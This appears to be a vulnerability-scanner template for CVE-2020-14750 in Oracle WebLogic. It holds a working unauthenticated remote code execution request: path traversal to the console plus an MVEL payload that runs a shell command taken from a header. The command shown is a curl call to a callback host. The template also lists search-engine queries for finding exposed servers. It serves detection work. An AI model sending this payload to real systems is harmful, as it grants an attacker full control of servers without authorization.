http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: header
    type: word
    words:
    - ADMINCONSOLESESSION=
  - part: body
    regex:
    - <html><head></head><body>(.*)</body></html>
    type: regex
  matchers-condition: and
  raw:
  - "@timeout: 10s\nPOST /console/css/%252e%252e%252fconsole.portal HTTP/1.1\nHost:\
    \ {{Hostname}}\nAccept: */*\ncmd: curl {{interactsh-url}}\nContent-Type: application/x-www-form-urlencoded\n\
    \n_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"\
    weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();\n\
    weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();\njava.lang.reflect.Field\
    \ field = adapter.getClass().getDeclaredField(\"connectionHandler\");\nfield.setAccessible(true);\n\
    Object obj = field.get(adapter);\nweblogic.servlet.internal.ServletRequestImpl\
    \ req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"\
    getServletRequest\").invoke(obj);\nString cmd = req.getHeader(\"cmd\");\nString[]\
    \ cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ?\
    \ new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};\n\
    if (cmd != null) {\n    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\
    \\\\A\").next();\n    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)\
    \ req.getClass().getMethod(\"getResponse\").invoke(req);\n    res.getServletOutputStream().writeStream(new\
    \ weblogic.xml.util.StringInputStream(result));\n    res.getServletOutputStream().flush();\n\
    \    res.getWriter().write(\"\");\n}executeThread.interrupt();\n\");\n"
id: CVE-2020-14750
info:
  author: princechaddha,DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:oracle:fusion_middleware:10.3.6.0:*:*:*:*:*:*:*
    cve-id: CVE-2020-14750
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99985
    epss-score: 0.94438
  description: 'Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0
    and 14.1.1.0.0 is susceptible to remote code execution. An attacker can execute
    malware, obtain sensitive information, modify data, and/or gain full control over
    a compromised machine without entering necessary credentials. See also CVE-2020-14882,
    which is addressed in the October 2020 Critical Patch Update.

    '
  impact: 'Successful exploitation of this vulnerability allows remote attackers to
    execute arbitrary commands with the privileges of the WebLogic server.

    '
  metadata:
    fofa-query:
    - title="weblogic"
    - body="weblogic application server"
    google-query: intitle:"weblogic"
    max-request: 1
    product: fusion_middleware
    shodan-query:
    - http.html:"Weblogic Application Server"
    - http.title:"weblogic"
    - http.html:"weblogic application server"
    vendor: oracle
    verified: true
  name: Oracle WebLogic Server - Remote Command Execution
  reference:
  - https://github.com/pprietosanchez/CVE-2020-14750
  - https://www.oracle.com/security-alerts/alert-cve-2020-14750.html
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14750
  - https://nvd.nist.gov/vuln/detail/CVE-2020-14750
  - http://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html
  remediation: 'Apply the latest security patches provided by Oracle to mitigate this
    vulnerability.

    '
  severity: critical
  tags: cve2020,cve,rce,oracle,weblogic,unauth,kev,packetstorm,vkev,vuln
